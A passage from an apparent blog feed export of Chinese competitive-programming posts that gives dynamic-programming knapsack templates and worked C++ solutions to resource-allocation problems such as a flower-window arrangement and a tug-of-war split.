class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> p=<span class="number">1</span>;p&lt;=n;p++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i+j-p&gt;<span class="number">0</span>) q=i+j-p;<span class="comment">//这里判断p能否计算出来</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">continue</span>;<span class="comment">//如果p不成立直接下一步</span></span><br><span class="line">            f[i][j][p][q]=a[i][j]+a[p][q];</span><br><span class="line">            First=max(f[i<span class="number">-1</span>][j][p<span class="number">-1</span>][q],f[i<span class="number">-1</span>][j][p][q<span class="number">-1</span>]);</span><br><span class="line">            Second=max(f[i][j<span class="number">-1</span>][p<span class="number">-1</span>][q],f[i][j<span class="number">-1</span>][p][q<span class="number">-1</span>]);</span><br><span class="line">            f[i][j][p][q]=max(First,Second)+a[i][j]+a[p][q];<span class="comment">//四种组合的比较</span></span><br><span class="line">            <span class="keyword">if</span>(i==p&amp;&amp;j==q) f[i][j][p][q]-=a[i][j];<span class="comment">//如果发现重复，要减去一遍</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[n][m][n][m]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="后言："><a href="#后言：" class="headerlink" title="后言："></a>后言：</h1><blockquote>
<p>下一个攻略的目标就是区间动态规划，加油！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>背包问题DP</title>
    <url>/2017/05/19/61aad91fa371/</url>
    <content><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><blockquote>
<p>其实在最开始接触贪心的时候就知道这种背包问题了，然后我就死想贪心思路，但是根本想不到好吧，然后觉得这种背包问题真的是好厉害，世界上一定没有什么方法来解决背包问题了吧，但是只从我开始学了DP之后就明白了，原来这么简单QAQ</p>
</blockquote>
<h1 id="背包问题模板："><a href="#背包问题模板：" class="headerlink" title="背包问题模板："></a>背包问题模板：</h1><h2 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0/1背包问题"></a>0/1背包问题</h2><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>倒着逐步选择更新</p>
</blockquote>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Things;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Weight&gt;&gt;Value;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=Bag_weight;j&gt;=Weight;j--)</span><br><span class="line">    f[j]=max(f[j],f[j-Weight]+Value[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="完全背包问题"><a href="#完全背包问题" class="headerlink" title="完全背包问题"></a>完全背包问题</h2><h3 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>0/1背包的基础上进行正序更新</p>
</blockquote>
<h3 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Things;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Weight&gt;&gt;Value;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=Weight;j&lt;=Bag_weight;j++)<span class="comment">//循环方式和0/1是反的</span></span><br><span class="line">    f[j]=max(f[j],f[j-Weight]+Value[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="多重背包问题"><a href="#多重背包问题" class="headerlink" title="多重背包问题"></a>多重背包问题</h2><h3 id="方法：-2"><a href="#方法：-2" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>有数量限制，如果相当于无限多，那么就按照完全背包的处理方法，如果有限，转换为取1—n个的物品，用0/1背包加二进制优化。</p>
</blockquote>
<h3 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i].Weight*a[i].Number&gt;Bag_weight)<span class="comment">//如果可以用完全背包</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=a[i].Weight;j&lt;=Bag_weight;j++)</span><br><span class="line">        f[j]=max(f[j],f[j-a[i].Weight]+a[i].Value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This_number=<span class="number">1</span>,Surplus=a[i].Number;<span class="comment">//Surplus指的是要将物品几个分成一组</span></span><br><span class="line">        <span class="keyword">while</span>(This_number&lt;Surplus)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=Bag_weight;j&gt;=a[i].Weight*This_number;j--)</span><br><span class="line">            f[j]=max(f[j],f[j-a[i].Weight*This_number]+a[i].Value*This_number);</span><br><span class="line">            Surplus-=This_number;<span class="comment">//This_number存储还剩下几个物品没有成一组</span></span><br><span class="line">            This_number+=This_number;<span class="comment">//再次分成一组</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=Bag_weight;j&gt;=a[i].Weight*Surplus;j--)<span class="comment">//0/1背包</span></span><br><span class="line">        f[j]=max(f[j],f[j-a[i].Weight*Surplus]+a[i].Value*Surplus);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="混合背包问题"><a href="#混合背包问题" class="headerlink" title="混合背包问题"></a>混合背包问题</h2><h3 id="方法：-3"><a href="#方法：-3" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>混合背包判断是0/1背包就0/1背包处理，是完全背包就完全背包处理，是非一个非无穷的就按照多重背包处理。</p>
</blockquote>
<h3 id="代码：-3"><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3><blockquote>
<p>代码和楼上一样，不粘了。</p>
</blockquote>
<h2 id="二维费用流背包问题"><a href="#二维费用流背包问题" class="headerlink" title="二维费用流背包问题"></a>二维费用流背包问题</h2><h3 id="方法：-4"><a href="#方法：-4" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>增加要处理的维度，然后和前面的处理是一样的；</p>
</blockquote>
<h3 id="代码：-4"><a href="#代码：-4" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=The_Need_N2*<span class="number">3</span>;j&gt;=a[i].There_N2;j--)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=The_Need_O2*<span class="number">3</span>;k&gt;=a[i].There_O2;k--)</span><br><span class="line">f[j][k]=min(f[j][k],f[j-a[i].There_N2][k-a[i].There_O2]+a[i].Weight);</span><br></pre></td></tr></table></figure>
<h2 id="分组背包问题"><a href="#分组背包问题" class="headerlink" title="分组背包问题"></a>分组背包问题</h2><h3 id="方法：-5"><a href="#方法：-5" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>比如下面的分组有两组，两组是有冲突的每次只能选择其中的一组，我们只要放在一起直接当时处理掉，这样到后面不会有两个都有选择的情况。</p>
</blockquote>
<h3 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=Time;j&gt;=min(a[i].Right_time,a[i].Wrong_time);j--)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=a[i].Right_time) f[j]=max(f[j],f[j-a[i].Right_time]+a[i].Right_point);</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=a[i].Wrong_time) f[j]=max(f[j],f[j-a[i].Wrong_time]+a[i].Wrong_point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="特殊要求"><a href="#特殊要求" class="headerlink" title="特殊要求"></a>特殊要求</h2><h3 id="字典序最小方案"><a href="#字典序最小方案" class="headerlink" title="字典序最小方案"></a>字典序最小方案</h3><h4 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h4><blockquote>
<p>方案总数: <code>f[j]=f[j]+f[j-Weight];</code></p>
</blockquote>
<h3 id="最优方案"><a href="#最优方案" class="headerlink" title="最优方案"></a>最优方案</h3><h4 id="解法：-1"><a href="#解法：-1" class="headerlink" title="解法："></a>解法：</h4><blockquote>
<p>最优方案的总数：在计算f[i][j]的同时，记录下来一个g[i][j]，如果和当前最大值相等，就加上到达当前最大值的方案数。</p>
</blockquote>
<h4 id="代码：-6"><a href="#代码：-6" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;=<span class="number">1</span>;j--)</span><br><span class="line">&#123;</span><br><span class="line">    g[i][j]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j])</span><br><span class="line">    g[i][j]+=g[i<span class="number">-1</span>][j];</span><br><span class="line">    <span class="keyword">if</span>(f[i][j]==f[i<span class="number">-1</span>][j-Weight]+Value)</span><br><span class="line">    g[i][j]+=g[i<span class="number">-1</span>][j-Weight];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第K优解"><a href="#第K优解" class="headerlink" title="第K优解"></a>第K优解</h3><h4 id="方法：-6"><a href="#方法：-6" class="headerlink" title="方法："></a>方法：</h4><blockquote>
<p>建立一个数组f[i][j][k]，其中k表示第k优解，然后另外新建两个数组（其实可以建立一个，但是需要排序，比较耗费时间），然后记录下来选择f[i-1][j][k]，和f[i-1][j-weight][k]+value的值的时候，分别的值，然后最后进行同时合并。</p>
</blockquote>
<h4 id="代码：-7"><a href="#代码：-7" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Weight&gt;&gt;Value;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=v;j&gt;=Weight;j--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=Person;k++)<span class="comment">//两个数组记录方案</span></span><br><span class="line">        &#123;</span><br><span class="line">            First[k]=f[j][k];</span><br><span class="line">            Second[k]=f[j-Weight][k]+Value;</span><br><span class="line">        &#125;</span><br><span class="line">        First[Person+<span class="number">1</span>]=Second[Person+<span class="number">1</span>]=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> This=<span class="number">1</span>,The_First=<span class="number">1</span>,The_Second=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(This&lt;=Person)<span class="comment">//最后根据大小分配到k优解中</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(First[The_First]&gt;Second[The_Second])</span><br><span class="line">            f[j][This]=First[The_First++];</span><br><span class="line">            <span class="keyword">else</span> f[j][This]=Second[The_Second++];</span><br><span class="line">            This++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="背包问题的搜索算法"><a href="#背包问题的搜索算法" class="headerlink" title="背包问题的搜索算法"></a>背包问题的搜索算法</h2><h3 id="方法：-7"><a href="#方法：-7" class="headerlink" title="方法："></a>方法：</h3><blockquote>
<p>能不去搜索尽量不要搜，不然会后悔的……超级麻烦！(下面附上P1280的代码)</p>
</blockquote>
<h3 id="代码：-8"><a href="#代码：-8" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> Now_Thing,<span class="keyword">int</span> Now_CD,<span class="keyword">int</span> Now_times,<span class="keyword">int</span> ans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Get[Now_Thing][Now_CD][Now_times][ans]==<span class="literal">true</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> Get[Now_Thing][Now_CD][Now_times][ans]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(Time&lt;a[Now_Thing])</span><br><span class="line">    &#123;</span><br><span class="line">        DFS(Now_Thing+<span class="number">1</span>,Now_CD,Now_times,ans);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Now_CD&gt;CD)</span><br><span class="line">    &#123;</span><br><span class="line">        The_max=max(The_max,ans<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Now_Thing&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        The_max=max(The_max,ans);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    The_max=max(The_max,ans);</span><br><span class="line">    <span class="keyword">if</span>(Now_times+a[Now_Thing]&lt;=Time)</span><br><span class="line">    DFS(Now_Thing+<span class="number">1</span>,Now_CD,Now_times+a[Now_Thing],ans+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> DFS(Now_Thing+<span class="number">1</span>,Now_CD+<span class="number">1</span>,a[Now_Thing],ans+<span class="number">1</span>);</span><br><span class="line">    DFS(Now_Thing+<span class="number">1</span>,Now_CD,Now_times,ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="背包问题完结"><a href="#背包问题完结" class="headerlink" title="背包问题完结"></a>背包问题完结</h1><blockquote>
<p>背包问题总算是AC完了，这几天效率很高，很充实，加油吧！</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>资源分配类DP</title>
    <url>/2017/05/19/e4a58a3642cc/</url>
    <content><![CDATA[<h1 id="资源分配DP"><a href="#资源分配DP" class="headerlink" title="资源分配DP"></a>资源分配DP</h1><blockquote>
<p>资源分配千万不能套模板，本人有亲身经历，写了几道题之后以为资源分配就是这种类型的于是就开始敲，敲出来了常规类型的三维动态规划，虽然也AC了这道题，但是和学长的二维算法比起来，慢了4倍……</p>
</blockquote>
<ul>
<li>有P1266这道题，也是超级魔性，竟然和题目中的数据范围结合在了一起，不禁让我想起来了寒假的时候老师给我们模拟赛的一道题，也是规定了数据中数的大小是小于100的，很小，这就可以提示我们进行数组记录出现次数，来进行10000000的数据范围的处理，而这道题是数据大小小于450，然后就可以开一个100*450大小的数组进行处理每一种可能出现的情况……真的是丧心病狂……</li>
</ul>
<h1 id="双重爆炸"><a href="#双重爆炸" class="headerlink" title="双重爆炸"></a>双重爆炸</h1><blockquote>
<p>总之，现在的我对DP的方法理解就是根据题意和数据范围，然后猜测记录下来哪一些状态，然后想他的状态是取决于前面哪些状态的哪些因素……</p>
</blockquote>
<ul>
<li>我还是太弱了啊，DP方程蒙蔽，月考爆炸，一本线都过不了，要好好学习了QAQ</li>
</ul>
<p>……<br><br>然后就亮出三道比较好的题目吧！</p>
<h1 id="P1265花店橱窗"><a href="#P1265花店橱窗" class="headerlink" title="P1265花店橱窗"></a>P1265花店橱窗</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<ul>
<li>设你想以最美观的方式布置花店的橱窗。现在你有F束不同品种的花束，同时你也有至少同样数量的花瓶被按顺序摆成一行。这些花瓶的位置固定于架子上，并从1至V顺序编号，V是花瓶的数目，从左至右排列，则最左边的是花瓶1，最右边的是花瓶V。花束可以移动，并且每束花用1至F间的整数唯一标识。标识花束的整数决定了花束在花瓶中的顺序，如果I＜J，则令花束I必须放在花束J左边的花瓶中。</li>
<li>例如，假设一束杜鹃花的标识数为1，一束秋海棠的标识数为2，一束康乃馨的标识数为3，所有的花束在放入花瓶时必须保持其标识数的顺序，即：杜鹃花必须放在秋海棠左边的花瓶中，秋海棠必须放在康乃馨左边的花瓶中。如果花瓶的数目大于花束的数目。则多余的花瓶必须空置，且每个花瓶中只能放一束花</li>
<li>每一个花瓶都具有各自的特点。因此，当各个花瓶中放入不同的花束时，会产生不同的美学效果，并以美学值（一个整数）来表示，空置花瓶的美学值为零。</li>
<li>在上述例子中，花瓶与花束的不同搭配所具有的美学值<br>为取得最佳美学效果，你必须在保持花束顺序的前提下，使花束的摆放取得最大的美学值。如果有不止一种的摆放方式具有最大的美学值，你只要输出字典序最小的那种摆放方式。</li>
</ul>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<ol>
<li>第一行包含两个数：F，V。</li>
<li>随后的F行中，每行包含V个整数，Aij 即为输入文件中第（i+1 ）行中的第j个数。</li>
<li>1≤F≤100，其中F为花束的数量，花束编号从1至F。F≤V≤100，其中V是花瓶的数量。-50≤Aij≤50，其中Aij是花束i在花瓶j中的美学值。</li>
</ol>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<ol>
<li>一行是程序所产生摆放方式的美学值.</li>
<li>第二行必须用f个数表示摆放方式，即该行的第k个数表示花束k所在的花瓶的编号。</li>
</ol>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题啊，真的是很神奇呢，数据范围好水，用不正确的算法就可以水过去……首先说说我的思路吧，建立一个数组 <code>f[i][j]</code> 表示前i朵花放在前j个瓶子里的最大值，然后我连状态分析都没有就开始傻不拉几的套着模板状态转移，，一个三重预处理，一个三重循环，i，j，k，其中k负责找到i-1，j，k，中加上k到j的最大值的最大值……</p>
<p>然而正解是两重循环，i，j，只需要比较 <code>a[i][j-1]</code> 和 <code>a[i-1][j-1]+a[j]</code> 的值，也就是说，当前这个花的最大美学值是取决于是不是和少放一个花瓶一样或者说多放一个花瓶后，这个花瓶美学值加起来破纪录了，然后每次记录下来最大值就好了。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> Flower,Bottle,f[<span class="number">201</span>][<span class="number">201</span>];</span><br><span class="line"><span class="keyword">int</span> out[<span class="number">201</span>],a[<span class="number">201</span>][<span class="number">201</span>],Big;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(out,<span class="number">0</span>,<span class="keyword">sizeof</span>(out));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;Flower&gt;&gt;Bottle;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Flower;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Bottle;j++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Flower;i++)</span><br><span class="line">		f[i][<span class="number">0</span>]=<span class="number">-99999</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Flower;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=Bottle;j++)</span><br><span class="line">		f[i][j]=max(a[i][j]+f[i<span class="number">-1</span>][j<span class="number">-1</span>],f[i][j<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[Flower][Bottle]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    Big=f[Flower][Bottle];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Flower;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=Bottle;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(f[i][j]==Big)</span><br><span class="line">        &#123;</span><br><span class="line">            Big-=a[i][j];</span><br><span class="line">            out[i]=j;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Flower;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;out[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1266拔河比赛"><a href="#P1266拔河比赛" class="headerlink" title="P1266拔河比赛"></a>P1266拔河比赛</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>一个学校举行拔河比赛，所有的人被分成了两组，每个人必须（且只能够）在其中的一组，要求两个组的人数相差不能超过1，且两个组内的所有人体重加起来尽可能地接近.</p>
</blockquote>
<h2 id="输人："><a href="#输人：" class="headerlink" title="输人："></a>输人：</h2><blockquote>
<p>输入数据的第1行是一个n，表示参加拔河比赛的总人数，n&lt;=100，接下来的n行表示第1到第n个人的体重，每个人的体重都是整数（1&lt;=weight&lt;=450）。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出数据应该包含两个整数：分别是两个组的所有人的体重和，用一个空格隔开。注意如果这两个数不相等，则请把小的放在前面输出。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>然后首先拿到题如果没有做过这一类型的题目的话，应该会是一脸懵逼的说，首先这类题的状态转移很棘手，常规很难想出来，所以说直接记录下来如果当前数进入队列后的体重值是无法成立的，因为他不满足最优子数列，没错就是这么惨，那么如果无法记录下来最优的东西，我们就不妨换一个思路。</p>
<p>从题目中我们可以看出来数据的大小就是1到450，所以题目中就提示我们是从这里进行做文章，我们可以开一个数组，一个神奇的bool的二维数组 <code>f[n][n*450]（f[i][j]）</code> ，记录的是选择i个人，体重是否能够到达j <code>（false，true）</code> ，这里我们不需要记录从在前x个人中选择i个人的原因就是我们在不断更新的时候需要找到的是整体最优值。</p>
<p>然后我们就可以，列出来了状态转移方程了，我们只需要进行三重循环，i表示的是对于真正的选择i个人， <code>f[j][k]</code> 表示一共选择j个人，其中体重是否能够达到k。如果对于 <code>a[i]</code> 来说 <code>f[j-1][k-a[i]]</code> 如果为true，那么 <code>f[j][k]</code> 就一定为true，所以我们就列出来了状态转移方程。</p>
<p>所以说在记录的时候，我们呢最后找到的是选择 <code>n/2</code> 或者 <code>n/2+1</code> 个人中，能够最接近所有人的总体重值的 <code>All_weight/2</code> 的值，那么另一个值就是 <code>All_weight-ans</code> ，最后优先输出小的就好。</p>
<p>其实这种方法的实质是把解本身当作状态的一个参量，把最优解问题转化为判定性问题。</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">bool</span> f[<span class="number">101</span>][<span class="number">45001</span>];</span><br><span class="line"><span class="keyword">int</span> The_now_weight=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        The_now_weight+=a[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=min(n/<span class="number">2</span>,i);j&gt;=<span class="number">1</span>;j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=a[i];k&lt;=The_now_weight;k++)</span><br><span class="line">            <span class="keyword">if</span>(f[j<span class="number">-1</span>][k-a[i]]==<span class="literal">true</span>) f[j][k]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">-12345678</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=The_now_weight+<span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(f[n/<span class="number">2</span>][i]==<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(min(i,The_now_weight-i)&gt;ans)</span><br><span class="line">            ans=min(i,The_now_weight);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;min(ans,The_now_weight-ans)&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;max(ans,The_now_weight-ans)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1269马棚"><a href="#P1269马棚" class="headerlink" title="P1269马棚"></a>P1269马棚</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
